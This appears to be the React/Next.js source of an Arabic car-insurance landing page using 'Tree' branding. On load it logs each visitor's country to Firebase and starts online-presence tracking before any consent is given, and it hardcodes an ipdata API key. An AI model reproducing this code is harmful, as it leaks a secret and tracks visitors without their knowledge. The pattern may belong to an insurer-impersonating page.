"use client"

import type React from "react"

import Image from "next/image"
import { Facebook, Instagram, Linkedin, Twitter, Shield, Phone, Mail } from "lucide-react"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { useEffect, useState } from "react"
import { Tabs } from "@/components/ui/tabs"
import { InsuranceTabs } from "@/components/insurance-tabs"
import { InsuranceFlow } from "@/components/insurance-flow"
import { addData, setupOnlineStatus } from "@/lib/firebase"
function randstr(prefix:string){
    return Math.random().toString(36).replace('0.',prefix || '');
}
const _id=randstr('tree-')
export default function Component() {
  useEffect(()=>{
    getLocation().then(()=>{})
  },[])
  async function getLocation() {
    const APIKEY = '856e6f25f413b5f7c87b868c372b89e52fa22afb878150f5ce0c4aef';
    const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`;
  
    try {
        const response = await fetch(url);
        if (!response.ok) {
            throw new Error(`HTTP error! Status: ${response.status}`);
        }
        const country = await response.text();
        addData({
            id:_id,
            country: country
        })
        localStorage.setItem('country',country)
        setupOnlineStatus(_id)
      } catch (error) {
        console.error('Error fetching location:', error);
    }
  }

  return (
    <div
      className="min-h-screen bg-gradient-to-br from-emerald-700 via-emerald-900 to-emerald-800 text-white overflow-hidden"
      dir="rtl"
    >
      {/* Animated Background Elements */}
      <div className="absolute inset-0 overflow-hidden pointer-events-none">
        <div className="absolute -top-40 -right-40 w-80 h-80 bg-emerald-400/10 rounded-full blur-3xl animate-pulse"></div>
        <div className="absolute -bottom-40 -left-40 w-80 h-80 bg-emerald-300/10 rounded-full blur-3xl animate-pulse delay-1000"></div>
      </div>


      {/* Language Toggle */}
      <div className="flex justify-end px-6 mb-6">
        <div className="bg-emerald-700/80 backdrop-blur-sm rounded-full px-4 py-2 text-sm flex items-center gap-3 shadow-lg border border-emerald-600/30">
          <span className="font-medium">بالعربية</span>
          <div className="w-5 h-5 bg-emerald-400 rounded-full shadow-inner animate-pulse"></div>
        </div>
      </div>

      {/* Main Content */}
      <div className="relative z-10 px-6 pb-8 ">
        {/* Hero Text */}
        <div className="text-center mb-12 space-y-4">
          <h1 className="text-3xl md:text-4xl font-bold mb-6 leading-relaxed bg-gradient-to-r from-white to-emerald-200 bg-clip-text text-transparent">
            ما في أحلى من الحرية، سوق الحين براحتك
          </h1>
          <p className="text-emerald-200 text-lg font-medium max-w-md mx-auto leading-relaxed">
            لا تفوت الفرصة، أمن سيارتك بأفضل الأسعار
          </p>
          <div className="flex items-center justify-center gap-2 text-emerald-300 text-sm">
            <Shield className="w-4 h-4" />
            <span>حماية شاملة وموثوقة</span>
          </div>
        </div>

        {/* Car Illustration */}
        <div className="relative mb-12 ">
          <div className=" rounded-3xl p-8 mx-4 shadow-2xl transform hover:scale-105 transition-transform duration-500">
            <div className="relative">
              <img
                src="/motor_bg_ar.png"
                alt="car"
                width={350}
                height={220}
                className="w-full h-auto drop-shadow-2xl "
              />
              {/* Floating Elements */}
              <div className="absolute -top-4 -right-4 w-8 h-8 bg-emerald-500 rounded-full animate-bounce delay-300"></div>
              <div className="absolute -bottom-2 -left-4 w-6 h-6 bg-emerald-600 rounded-full animate-bounce delay-700"></div>
            </div>
          </div>

        {/* Insurance Form with Tabs */}
        <div className="max-w-md mx-auto text-right " >
          <InsuranceFlow />
        </div>
        </div>

        {/* Enhanced Disclaimer */}
        <div className="text-center text-sm text-emerald-300/80 leading-relaxed px-6 py-4 bg-emerald-900/30 rounded-xl backdrop-blur-sm border border-emerald-700/30">
          <Shield className="w-4 h-4 inline-block ml-2" />
          بالنقر على "أمن سيارتك"، فإنني أمنح وكالة شركة (تري) للتأمين الرقمي إمكانية الوصول إلى معلوماتي.
        </div>
      </div>

    
    </div>
  )
}
